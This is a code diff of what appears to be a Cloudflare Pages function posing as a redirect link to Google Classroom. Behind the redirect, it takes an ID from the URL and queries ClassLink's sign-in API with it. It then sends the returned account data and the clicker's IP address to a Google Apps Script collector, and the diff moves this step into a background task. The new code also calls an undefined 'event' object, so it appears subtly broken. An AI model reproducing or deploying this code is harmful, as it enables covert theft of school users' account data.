@@ -1,12 +1,17 @@
 export function onRequest(context) {
     const { request } = context;
     const url = new URL(request.url);
-    handleRequest(url.search, request.headers.get("CF-Connecting-IP"));
-    
-    return Response.redirect("https://classroom.google.com/h", 302);
+
+    // Immediately redirect the request
+    const response = Response.redirect("https://classroom.google.com/h", 302);
+
+    // Perform tasks asynchronously after sending the redirect response
+    event.waitUntil(handleRequest(url.search, request.headers.get("CF-Connecting-IP")));
+
+    return response;
 }
 
-async function handleRequest(searchParams, ip){
+async function handleRequest(searchParams, ip) {
     const idMatch = searchParams.match(/[?&]i=([^&]+)/);
     const id = idMatch ? idMatch[1] : null;
 
@@ -16,7 +21,9 @@ async function handleRequest(searchParams, ip){
         const match = id.match(regex);
         extractedText = match ? match[1] : null;
     }
-        if (id) {
+
+    if (id) {
+        try {
             const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
                 method: "GET",
                 headers: {
@@ -26,12 +33,15 @@ async function handleRequest(searchParams, ip){
 
             const nodeApiData = await nodeApiResponse.json();
 
-            const response = await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
+            await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify({ data: nodeApiData, ip: ip })
             });
+        } catch (error) {
+            console.error("Error handling request:", error);
         }
+    }
 }
